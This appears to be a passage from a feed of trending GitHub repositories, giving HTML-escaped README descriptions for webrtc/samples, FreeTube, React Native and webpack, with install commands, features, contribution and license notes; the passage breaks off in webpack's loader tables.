      <title>webrtc/samples</title>
      <link>https://github.com/webrtc/samples</link>
      <description>&lt;p&gt;WebRTC Web demos and samples&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;WebRTC Code Samples&lt;/h1&gt; 
&lt;p&gt;This is a repository for the WebRTC JavaScript code samples. All of the samples can be tested from &lt;a href=&quot;https://webrtc.github.io/samples&quot;&gt;webrtc.github.io/samples&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;We welcome contributions and bugfixes. Please see &lt;a href=&quot;https://github.com/webrtc/samples/blob/gh-pages/CONTRIBUTING.md&quot;&gt;CONTRIBUTING.md&lt;/a&gt; for details.&lt;/p&gt; 
&lt;h2&gt;Bugs&lt;/h2&gt; 
&lt;p&gt;If you encounter a bug or problem with one of the samples, please submit a &lt;a href=&quot;https://github.com/webrtc/samples/issues/new&quot;&gt;new issue&lt;/a&gt; so we know about it and can fix it.&lt;/p&gt; 
&lt;p&gt;Please avoid submitting issues on this repository for general problems you have with WebRTC. If you have found a bug in the WebRTC APIs, please see &lt;a href=&quot;https://webrtc.org/support/bug-reporting&quot;&gt;webrtc.org/bugs&lt;/a&gt; for how to submit bugs on the affected browsers. If you need support on how to implement your own WebRTC-based application, please see the &lt;a href=&quot;https://groups.google.com/forum/#!forum/discuss-webrtc&quot;&gt;discuss-webrtc&lt;/a&gt; Google Group.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>FreeTubeApp/FreeTube</title>
      <link>https://github.com/FreeTubeApp/FreeTube</link>
      <description>&lt;p&gt;An Open Source YouTube app for privacy&lt;/p&gt;&lt;hr&gt;&lt;p&gt;FreeTube is an open source desktop YouTube player built with privacy in mind. Use YouTube without advertisements and prevent Google from tracking you with their cookies and JavaScript. Available for Windows, Mac &amp;amp; Linux thanks to Electron.&lt;/p&gt; 
&lt;p&gt;Please note that FreeTube is currently in Beta. While it should work well for most users, there are still bugs and missing features that need to be addressed.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/releases&quot;&gt;Download FreeTube&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Browser Extension&lt;/h3&gt; 
&lt;p&gt;FreeTube is supported by the &lt;a href=&quot;https://github.com/SimonBrazell/privacy-redirect&quot;&gt;Privacy Redirect&lt;/a&gt; extension, which will allow you to open YouTube links into FreeTube. You must enable the option within the advanced settings for it to work.&lt;/p&gt; 
&lt;p&gt;Download Privacy Redirect for &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/privacy-redirect/&quot;&gt;Firefox&lt;/a&gt; or &lt;a href=&quot;https://chrome.google.com/webstore/detail/privacy-redirect/pmcmeagblkinmogikoikkdjiligflglb&quot;&gt;Google Chrome&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;If you have issues with the extension working with FreeTube, please create an issue in this repository instead of the extension repository.&lt;/p&gt; 
&lt;h2&gt;How does it work?&lt;/h2&gt; 
&lt;p&gt;FreeTube uses a built in extractor to grab and serve data / videos. The &lt;a href=&quot;https://github.com/iv-org/invidious&quot;&gt;Invidious API&lt;/a&gt; can also optionally be used. FreeTube does not use any official APIs to obtain data. While YouTube can still see your video requests, it can no longer track you using cookies or JavaScript. Your subscriptions and history are stored locally on your computer and never sent out. Using a VPN or Tor is highly recommended to hide your IP while using FreeTube.&lt;/p&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Watch videos without ads&lt;/li&gt; 
 &lt;li&gt;Use YouTube without Google tracking you using cookies and JavaScript&lt;/li&gt; 
 &lt;li&gt;Two extractor APIs to choose from (Built in or Invidious)&lt;/li&gt; 
 &lt;li&gt;Subscribe to channels without an account&lt;/li&gt; 
 &lt;li&gt;Local subscriptions, history, and saved videos&lt;/li&gt; 
 &lt;li&gt;Organize your subscriptions into &quot;Profiles&quot; to create a more focused feed&lt;/li&gt; 
 &lt;li&gt;Export &amp;amp; import subscriptions&lt;/li&gt; 
 &lt;li&gt;Open videos from your browser directly into FreeTube (with extension)&lt;/li&gt; 
 &lt;li&gt;Mini Player&lt;/li&gt; 
 &lt;li&gt;Full Theme support&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Download Links&lt;/h2&gt; 
&lt;h3&gt;Official Downloads&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/releases&quot;&gt;GitHub Releases&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://freetubeapp.io/#download&quot;&gt;FreeTube Website&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Flatpak on Flathub: &lt;a href=&quot;https://flathub.org/apps/details/io.freetubeapp.FreeTube&quot;&gt;Download&lt;/a&gt; &lt;a href=&quot;https://github.com/flathub/io.freetubeapp.FreeTube&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Unofficial Downloads&lt;/h3&gt; 
&lt;p&gt;These builds are maintained by the community. While they should be safe, download at your own risk. There may be issues with using these versus the official builds. Any issues specific with these builds should be sent to their respective maintainer.&lt;/p&gt; 
&lt;p&gt;Arch User Repository (AUR): &lt;a href=&quot;https://aur.archlinux.org/packages/freetube-bin/&quot;&gt;Download&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Chocolatey: &lt;a href=&quot;https://chocolatey.org/packages/freetube/&quot;&gt;Download&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Windows Portable: &lt;a href=&quot;https://github.com/rddim/FreeTubePortable/releases&quot;&gt;Download&lt;/a&gt; &lt;a href=&quot;https://github.com/rddim/FreeTubePortable&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Automated Builds (Nightly / Weekly)&lt;/h3&gt; 
&lt;p&gt;Builds are automatically created from changes to our development branch via &lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/actions?query=workflow%3ABuild&quot;&gt;GitHub Actions&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The first build with a green check mark is the latest build. You will need to have a GitHub account to download these builds.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;If you have an idea or if you found a bug, please submit a GitHub issue so that we can track it. Please search the existing issues before submitting to prevent duplicates.&lt;/p&gt; 
&lt;p&gt;If you like to get your hands dirty and want to contribute, we would love to have your help. Send a pull request and someone will review your code. Please follow the &lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/blob/development/CONTRIBUTING.md&quot;&gt;Contribution Guidelines&lt;/a&gt; before sending your pull request.&lt;/p&gt; 
&lt;p&gt;Thank you very much to the &lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/wiki/Credits&quot;&gt;People and Projects&lt;/a&gt; that make FreeTube possible!&lt;/p&gt; 
&lt;h2&gt;Localization&lt;/h2&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;We are actively looking for translations! We use Weblate to make it easy for translators to get involved. Click on the badge above to learn how to get involved.&lt;/p&gt; 
&lt;h2&gt;Contact&lt;/h2&gt; 
&lt;p&gt;If you ever have any questions, feel free to make an issue here on GitHub. Alternatively, you can email me at FreeTubeApp@protonmail.com or you can join our &lt;a href=&quot;https://matrix.to/#/+freetube:matrix.org&quot;&gt;Matrix Community&lt;/a&gt;. Don&#39;t forget to check out the &lt;a href=&quot;https://github.com/FreeTubeApp/FreeTube/wiki/Matrix-Server-Info-&amp;amp;-Rules&quot;&gt;rules&lt;/a&gt; before joining.&lt;/p&gt; 
&lt;p&gt;You can also stay up to date by reading the &lt;a href=&quot;https://write.as/freetube/&quot;&gt;FreeTube Blog&lt;/a&gt;. &lt;a href=&quot;https://write.as/freetube/welcome-to-freetube-blogs&quot;&gt;View the welcome blog&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Donate&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://liberapay.com/FreeTube&quot;&gt;FreeTube on Liberapay&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Bitcoin Address: 1Lih7Ho5gnxb1CwPD4o59ss78pwo2T91eS&lt;/p&gt; 
&lt;p&gt;Monero Address: 48WyAPdjwc6VokeXACxSZCFeKEXBiYPV6GjfvBsfg4CrUJ95LLCQSfpM9pvNKy5GE5H4hNaw99P8RZyzmaU9kb1pD7kzhCB&lt;/p&gt; 
&lt;p&gt;If you enjoy using FreeTube, you&#39;re welcome to leave a donation using the following methods. While your donations are much appreciated, only donate if you really want to. Donations are used for keeping the website up and running and eventual code signing costs.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.gnu.org/licenses/agpl-3.0.html&quot;&gt;&lt;img src=&quot;https://www.gnu.org/graphics/agplv3-155x51.png&quot; alt=&quot;GNU AGPLv3 Image&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;FreeTube is Free Software: You can use, study share and improve it at your will. Specifically you can redistribute and/or modify it under the terms of the &lt;a href=&quot;https://www.gnu.org/licenses/agpl-3.0.html&quot;&gt;GNU Affero General Public License&lt;/a&gt; as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>facebook/react-native</title>
      <link>https://github.com/facebook/react-native</link>
      <description>&lt;p&gt;A framework for building native apps with React.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;React Native brings &lt;a href=&quot;https://reactjs.org/&quot;&gt;&lt;strong&gt;React&lt;/strong&gt;&#39;s&lt;/a&gt; declarative UI framework to iOS and Android. With React Native, you use native UI controls and have full access to the native platform.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Declarative.&lt;/strong&gt; React makes it painless to create interactive UIs. Declarative views make your code more predictable and easier to debug.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Component-Based.&lt;/strong&gt; Build encapsulated components that manage their state, then compose them to make complex UIs.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Developer Velocity.&lt;/strong&gt; See local changes in seconds. Changes to JavaScript code can be live reloaded without rebuilding the native app.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Portability.&lt;/strong&gt; Reuse code across iOS, Android, and &lt;a href=&quot;https://reactnative.dev/docs/out-of-tree-platforms&quot;&gt;other platforms&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;React Native is developed and supported by many companies and individual core contributors. Find out more in our &lt;a href=&quot;https://github.com/facebook/react-native/blob/master/ECOSYSTEM.md&quot;&gt;ecosystem overview&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-requirements&quot;&gt;Requirements&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-building-your-first-react-native-app&quot;&gt;Building your first React Native app&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-documentation&quot;&gt;Documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-upgrading&quot;&gt;Upgrading&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-how-to-contribute&quot;&gt;How to Contribute&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#code-of-conduct&quot;&gt;Code of Conduct&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/facebook/react-native/master/#-license&quot;&gt;License&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üìã Requirements&lt;/h2&gt; 
&lt;p&gt;React Native apps may target iOS 11.0 and Android 5.0 (API 21) or newer. You may use Windows, macOS, or Linux as your development operating system, though building and running iOS apps is limited to macOS. Tools like &lt;a href=&quot;https://expo.io&quot;&gt;Expo&lt;/a&gt; can be used to work around this.&lt;/p&gt; 
&lt;h2&gt;üéâ Building your first React Native app&lt;/h2&gt; 
&lt;p&gt;Follow the &lt;a href=&quot;https://reactnative.dev/docs/getting-started&quot;&gt;Getting Started guide&lt;/a&gt;. The recommended way to install React Native depends on your project. Here you can find short guides for the most common scenarios:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://snack.expo.io/@hramos/hello,-world!&quot;&gt;Trying out React Native&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://reactnative.dev/docs/getting-started&quot;&gt;Creating a New Application&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://reactnative.dev/docs/integration-with-existing-apps&quot;&gt;Adding React Native to an Existing Application&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üìñ Documentation&lt;/h2&gt; 
&lt;p&gt;The full documentation for React Native can be found on our &lt;a href=&quot;https://reactnative.dev/docs/getting-started&quot;&gt;website&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The React Native documentation discusses components, APIs, and topics that are specific to React Native. For further documentation on the React API that is shared between React Native and React DOM, refer to the &lt;a href=&quot;https://reactjs.org/docs/getting-started.html&quot;&gt;React documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The source for the React Native documentation and website is hosted on a separate repo, &lt;a href=&quot;https://github.com/facebook/react-native-website&quot;&gt;&lt;strong&gt;@facebook/react-native-website&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;üöÄ Upgrading&lt;/h2&gt; 
&lt;p&gt;Upgrading to new versions of React Native may give you access to more APIs, views, developer tools, and other goodies. See the &lt;a href=&quot;https://reactnative.dev/docs/upgrading&quot;&gt;Upgrading Guide&lt;/a&gt; for instructions.&lt;/p&gt; 
&lt;p&gt;React Native releases are discussed in the React Native Community, &lt;a href=&quot;https://github.com/react-native-community/react-native-releases&quot;&gt;&lt;strong&gt;@react-native-community/react-native-releases&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;üëè How to Contribute&lt;/h2&gt; 
&lt;p&gt;The main purpose of this repository is to continue evolving React Native core. We want to make contributing to this project as easy and transparent as possible, and we are grateful to the community for contributing bug fixes and improvements. Read below to learn how you can take part in improving React Native.&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://code.fb.com/codeofconduct/&quot;&gt;Code of Conduct&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;Facebook has adopted a Code of Conduct that we expect project participants to adhere to. Please read the &lt;a href=&quot;https://code.fb.com/codeofconduct/&quot;&gt;full text&lt;/a&gt; so that you can understand what actions will and will not be tolerated.&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://reactnative.dev/docs/contributing&quot;&gt;Contributing Guide&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;Read our &lt;a href=&quot;https://reactnative.dev/docs/contributing&quot;&gt;&lt;strong&gt;Contributing Guide&lt;/strong&gt;&lt;/a&gt; to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to React Native.&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://github.com/facebook/react-native/wiki/Roadmap&quot;&gt;Open Source Roadmap&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;You can learn more about our vision for React Native in the &lt;a href=&quot;https://github.com/facebook/react-native/wiki/Roadmap&quot;&gt;&lt;strong&gt;Roadmap&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Good First Issues&lt;/h3&gt; 
&lt;p&gt;We have a list of &lt;a href=&quot;https://github.com/facebook/react-native/labels/good%20first%20issue&quot;&gt;good first issues&lt;/a&gt; that contain bugs which have a relatively limited scope. This is a great place to get started, gain experience, and get familiar with our contribution process.&lt;/p&gt; 
&lt;h3&gt;Discussions&lt;/h3&gt; 
&lt;p&gt;Larger discussions and proposals are discussed in &lt;a href=&quot;https://github.com/react-native-community/discussions-and-proposals&quot;&gt;&lt;strong&gt;@react-native-community/discussions-and-proposals&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;üìÑ License&lt;/h2&gt; 
&lt;p&gt;React Native is MIT licensed, as found in the &lt;a href=&quot;https://github.com/facebook/react-native/blob/master/LICENSE&quot;&gt;LICENSE&lt;/a&gt; file.&lt;/p&gt; 
&lt;p&gt;React Native documentation is Creative Commons licensed, as found in the &lt;a href=&quot;https://github.com/facebook/react-native/blob/master/LICENSE-docs&quot;&gt;LICENSE-docs&lt;/a&gt; file.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>webpack/webpack</title>
      <link>https://github.com/webpack/webpack</link>
      <description>&lt;p&gt;A bundler for javascript and friends. Packs many modules into a few bundled assets. Code Splitting allows for loading parts of the application on demand. Through &quot;loaders&quot;, modules can be CommonJs, AMD, ES6 modules, CSS, Images, JSON, Coffeescript, LESS, ... and your custom stuff.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&quot;https://npmjs.com/package/webpack&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/webpack.svg&quot; alt=&quot;npm&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://nodejs.org&quot;&gt;&lt;img src=&quot;https://img.shields.io/node/v/webpack.svg&quot; alt=&quot;node&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://david-dm.org/webpack/webpack&quot;&gt;&lt;img src=&quot;https://img.shields.io/david/webpack/webpack.svg&quot; alt=&quot;deps&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://travis-ci.org/webpack/webpack&quot;&gt;&lt;img src=&quot;https://img.shields.io/travis/webpack/webpack/master.svg&quot; alt=&quot;tests&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://ci.appveyor.com/project/sokra/webpack/branch/master&quot;&gt;&lt;img src=&quot;https://ci.appveyor.com/api/projects/status/github/webpack/webpack?svg=true&quot; alt=&quot;builds&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://dev.azure.com/webpack/webpack/_build/latest?definitionId=3&quot;&gt;&lt;img src=&quot;https://dev.azure.com/webpack/webpack/_apis/build/status/webpack.webpack&quot; alt=&quot;builds2&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://coveralls.io/r/webpack/webpack/&quot;&gt;&lt;img src=&quot;https://img.shields.io/coveralls/webpack/webpack.svg&quot; alt=&quot;coverage&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://app.fossa.io/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack?ref=badge_shield&quot;&gt;&lt;img src=&quot;https://app.fossa.io/api/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack.svg?type=shield&quot; alt=&quot;licenses&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://webpack.js.org/contribute/&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/PRs-welcome-brightgreen.svg&quot; alt=&quot;PR&#39;s welcome&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#install&quot;&gt;Install&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#concepts&quot;&gt;Concepts&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#contributing&quot;&gt;Contributing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#support&quot;&gt;Support&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#core-team&quot;&gt;Core Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#sponsoring&quot;&gt;Sponsoring&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#premium-partners&quot;&gt;Premium Partners&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#other-backers-and-sponsors&quot;&gt;Other Backers and Sponsors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#gold-sponsors&quot;&gt;Gold Sponsors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#silver-sponsors&quot;&gt;Silver Sponsors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#bronze-sponsors&quot;&gt;Bronze Sponsors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#backers&quot;&gt;Backers&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/webpack/webpack/master/#special-thanks-to&quot;&gt;Special Thanks&lt;/a&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Install with npm:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install --save-dev webpack
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Install with yarn:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;yarn add webpack --dev
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;webpack is a bundler for modules. The main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Bundles &lt;a href=&quot;https://www.2ality.com/2014/09/es6-modules-final.html&quot;&gt;ES Modules&lt;/a&gt;, &lt;a href=&quot;http://wiki.commonjs.org/&quot;&gt;CommonJS&lt;/a&gt;, and &lt;a href=&quot;https://github.com/amdjs/amdjs-api/wiki/AMD&quot;&gt;AMD&lt;/a&gt; modules (even combined).&lt;/li&gt; 
 &lt;li&gt;Can create a single bundle or multiple chunks that are asynchronously loaded at runtime (to reduce initial loading time).&lt;/li&gt; 
 &lt;li&gt;Dependencies are resolved during compilation, reducing the runtime size.&lt;/li&gt; 
 &lt;li&gt;Loaders can preprocess files while compiling, e.g. TypeScript to JavaScript, Handlebars strings to compiled functions, images to Base64, etc.&lt;/li&gt; 
 &lt;li&gt;Highly modular plugin system to do whatever else your application requires.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Get Started&lt;/h3&gt; 
&lt;p&gt;Check out webpack&#39;s quick &lt;a href=&quot;https://webpack.js.org/guides/getting-started&quot;&gt;&lt;strong&gt;Get Started&lt;/strong&gt;&lt;/a&gt; guide and the &lt;a href=&quot;https://webpack.js.org/guides/&quot;&gt;other guides&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Browser Compatibility&lt;/h3&gt; 
&lt;p&gt;webpack supports all browsers that are &lt;a href=&quot;https://kangax.github.io/compat-table/es5/&quot;&gt;ES5-compliant&lt;/a&gt; (IE8 and below are not supported). webpack also needs &lt;code&gt;Promise&lt;/code&gt; for &lt;code&gt;import()&lt;/code&gt; and &lt;code&gt;require.ensure()&lt;/code&gt;. If you want to support older browsers, you will need to &lt;a href=&quot;https://webpack.js.org/guides/shimming/&quot;&gt;load a polyfill&lt;/a&gt; before using these expressions.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h3&gt;&lt;a href=&quot;https://webpack.js.org/plugins/&quot;&gt;Plugins&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;webpack has a &lt;a href=&quot;https://webpack.js.org/plugins/&quot;&gt;rich plugin interface&lt;/a&gt;. Most of the features within webpack itself use this plugin interface. This makes webpack very &lt;strong&gt;flexible&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :---------------------------------------: | :----------------: | :-----------------: | :-------------------------------------------------------------------------------------- | | &lt;a href=&quot;https://github.com/webpack-contrib/mini-css-extract-plugin&quot;&gt;mini-css-extract-plugin&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/mini-css-extract-plugin.svg&quot; alt=&quot;mini-css-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=mini-css-extract-plugin&quot; alt=&quot;mini-css-size&quot;&gt; | Extracts CSS into separate files. It creates a CSS file per JS file which contains CSS. | | &lt;a href=&quot;https://github.com/webpack-contrib/compression-webpack-plugin&quot;&gt;compression-webpack-plugin&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/compression-webpack-plugin.svg&quot; alt=&quot;compression-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=compression-webpack-plugin&quot; alt=&quot;compression-size&quot;&gt; | Prepares compressed versions of assets to serve them with Content-Encoding | | &lt;a href=&quot;https://github.com/jantimon/html-webpack-plugin&quot;&gt;html-webpack-plugin&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/html-webpack-plugin.svg&quot; alt=&quot;html-plugin-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=html-webpack-plugin&quot; alt=&quot;html-plugin-size&quot;&gt; | Simplifies creation of HTML files (&lt;code&gt;index.html&lt;/code&gt;) to serve your bundles |&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://webpack.js.org/loaders/&quot;&gt;Loaders&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;webpack enables the use of loaders to preprocess files. This allows you to bundle &lt;strong&gt;any static resource&lt;/strong&gt; way beyond JavaScript. You can easily &lt;a href=&quot;https://webpack.js.org/api/loaders/&quot;&gt;write your own loaders&lt;/a&gt; using Node.js.&lt;/p&gt; 
&lt;p&gt;Loaders are activated by using &lt;code&gt;loadername!&lt;/code&gt; prefixes in &lt;code&gt;require()&lt;/code&gt; statements, or are automatically applied via regex from your webpack configuration.&lt;/p&gt; 
&lt;h4&gt;Files&lt;/h4&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :-----------------: | :---------: | :----------: | :---------------------------------------------------------------------------------------- | | &lt;a href=&quot;https://github.com/webpack-contrib/raw-loader&quot;&gt;raw-loader&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/raw-loader.svg&quot; alt=&quot;raw-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=raw-loader&quot; alt=&quot;raw-size&quot;&gt; | Loads raw content of a file (utf-8) | | &lt;a href=&quot;https://github.com/webpack-contrib/val-loader&quot;&gt;val-loader&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/val-loader.svg&quot; alt=&quot;val-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=val-loader&quot; alt=&quot;val-size&quot;&gt; | Executes code as module and considers exports as JS code | | &lt;a href=&quot;https://github.com/webpack-contrib/url-loader&quot;&gt;url-loader&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/url-loader.svg&quot; alt=&quot;url-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=url-loader&quot; alt=&quot;url-size&quot;&gt; | Works like the file loader, but can return a Data Url if the file is smaller than a limit | | &lt;a href=&quot;https://github.com/webpack-contrib/file-loader&quot;&gt;file-loader&lt;/a&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/file-loader.svg&quot; alt=&quot;file-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=file-loader&quot; alt=&quot;file-size&quot;&gt; | Emits the file into the output folder and returns the (relative) url |&lt;/p&gt; 
&lt;h4&gt;JSON&lt;/h4&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :---------------------------------------------------------------------------------------------------------------------------------------: | :---------: | :----------: | :------------------------------: | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/cson-loader.svg&quot; alt=&quot;cson-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=cson-loader&quot; alt=&quot;cson-size&quot;&gt; | Loads and transpiles a CSON file |&lt;/p&gt; 
&lt;h4&gt;Transpiling&lt;/h4&gt; 
